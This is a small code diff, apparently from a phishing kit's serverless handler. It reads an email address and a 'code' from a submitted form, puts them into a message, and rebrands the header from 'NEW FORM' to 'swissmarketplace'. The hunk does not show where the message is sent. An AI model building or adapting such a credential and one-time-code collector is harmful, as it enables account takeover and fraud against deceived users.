@@ -10,7 +10,7 @@ module.exports = async function handler(req, res) {
     const { email, code } = req.body;
 
     const message = `
-📩 NEW FORM
+📩 swissmarketplace
 
 📧 Email: ${email}
 🔑 code: ${code}
